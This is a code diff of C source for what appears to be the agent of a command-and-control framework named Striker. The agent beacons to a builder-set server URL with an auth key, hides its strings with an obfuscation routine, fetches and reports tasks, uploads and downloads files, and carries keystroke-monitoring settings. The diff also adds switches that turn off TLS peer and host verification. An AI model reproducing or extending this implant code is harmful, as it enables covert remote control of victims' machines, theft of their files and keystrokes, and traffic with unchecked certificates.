@@ -23,12 +23,19 @@
 #define KEYMON_MAX_PROCS 100
 // Keymon's process refresh rate (in secs)
 #define KEYMON_PROC_DELAY 1
-
+// Max URL length allowed
 #define URL_SIZE (sizeof(char) * 256)
-char BASE_URL[URL_SIZE] = "[STRIKER_URL]"; // A marker for the server URL.
-char AUTH_KEY[sizeof(char) * 33] = "[STRIKER_AUTH_KEY]"; // A marker for the authentication key to use for connecting.
-char OBFS_KEY[sizeof(char) * 20] = "[STRIKER_OBFS_KEY]"; // A marker for the key to use for obfuscating strings.
-char DELAY[sizeof(char) * 20] = "[STRIKER_DELAY]"; // A marker for the callback delay.
+
+// SSL config
+#define SKIP_PEER_VERIFICATION
+#define SKIP_HOST_VERIFICATION
+
+// Markers for the agent builder.
+char BASE_URL[URL_SIZE] = "[STRIKER_URL]";
+char AUTH_KEY[sizeof(char) * 33] = "[STRIKER_AUTH_KEY]";
+char OBFS_KEY[sizeof(char) * 20] = "[STRIKER_OBFS_KEY]";
+char DELAY[sizeof(char) * 20] = "[STRIKER_DELAY]";
+
 
 char *obfs_decode(char *str){
 
@@ -45,7 +52,7 @@ char *obfs_decode(char *str){
   return str;
 }
 
-CURL *init_curl(const char *path, buffer *buff){
+CURL *init_curl(const char *path, buffer *buff, unsigned char absolute){
   
   CURL *curl = curl_easy_init();
   if (!curl){
@@ -55,11 +62,20 @@ CURL *init_curl(const char *path, buffer *buff){
     exit(EXIT_FAILURE);
   }
   char *url = malloc(URL_SIZE);
-  snprintf(url, URL_SIZE, "%s%s", BASE_URL, path);
+  if (absolute)
+    strncpy(url, path, URL_SIZE);
+  else
+    snprintf(url, URL_SIZE, "%s%s", BASE_URL, path);
   curl_easy_setopt(curl, CURLOPT_URL, url);
   curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
   curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
   curl_easy_setopt(curl, CURLOPT_WRITEDATA, buff);
+  #ifdef SKIP_PEER_VERIFICATION
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+  #endif
+  #ifdef SKIP_HOST_VERIFICATION
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+  #endif
   free(url);
   return curl;
 }
@@ -99,17 +115,14 @@ cJSON *sysinfo(){
 
 short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff){
 
-  CURL *curl = curl_easy_init();
-  if (!curl)
-    return 0;
+  buffer *body = create_buffer(0);
+  CURL *curl = init_curl(url, body, 1);
   char strs[][20] = {"[OBFS_ENC]file", "[OBFS_ENC]filename"};
   for (int i = 0; i < 2; i++)
     obfs_decode(strs[i]);
   CURLcode res;
   curl_mime *form;
   curl_mimepart *field;
-  buffer *body = create_buffer(0);
-  curl_easy_setopt(curl, CURLOPT_URL, url);
   form = curl_mime_init(curl);
   field = curl_mime_addpart(form);
   curl_mime_name(field, strs[0]);
@@ -118,8 +131,6 @@ short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff)
   curl_mime_name(field, strs[1]);
   curl_mime_data(field, filename, CURL_ZERO_TERMINATED);
   curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
-  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
-  curl_easy_setopt(curl, CURLOPT_WRITEDATA, body);
   res = curl_easy_perform(curl);
   free_buffer(body);
   curl_mime_free(form);
@@ -133,9 +144,7 @@ short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff)
 
 short int download_file(char *url, FILE *wfo, buffer *result_buff){
 
-  CURL *curl = curl_easy_init();
-  if (!curl)
-    return 0;
+  CURL *curl = init_curl(url, NULL, 1);
   CURLcode res;
   curl_easy_setopt(curl, CURLOPT_URL, url);
   curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
@@ -558,7 +567,7 @@ void start_session(){
         strncpy(BASE_URL, queue_get(base_addrs), URL_SIZE);
         resize_buffer(body, 0);
         if (strlen(striker->uid) == 0){ // No agent ID. Create a fresh session.
-          curl = init_curl(strs[3], body);
+          curl = init_curl(strs[3], body, 0);
           curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
           curl_easy_setopt(curl, CURLOPT_POSTFIELDS, tmp);
           fresh_conn = 1;
@@ -566,7 +575,7 @@ void start_session(){
           char *url = malloc(64);
           char fmt[] = "[OBFS_ENC]/agent/ping/%s";
           snprintf(url, 64, obfs_decode(fmt), striker->uid);
-          curl = init_curl(url, body);
+          curl = init_curl(url, body, 0);
           curl_easy_setopt(curl, CURLOPT_HTTPHEADER, get_headers);
           free(url);
           fresh_conn = 0;
@@ -698,7 +707,7 @@ void start_session(){
         }
         char *result = cJSON_PrintUnformatted(results);
         resize_buffer(body, 0);
-        curl = init_curl(tasksURL, body);
+        curl = init_curl(tasksURL, body, 0);
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, result);
         res = curl_easy_perform(curl);
@@ -731,7 +740,7 @@ void start_session(){
     }
     // Fetch new tasks tasks.
     resize_buffer(body, 0);
-    curl = init_curl(tasksURL, body);
+    curl = init_curl(tasksURL, body, 0);
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, get_headers);
     res = curl_easy_perform(curl);
     curl_easy_cleanup(curl);
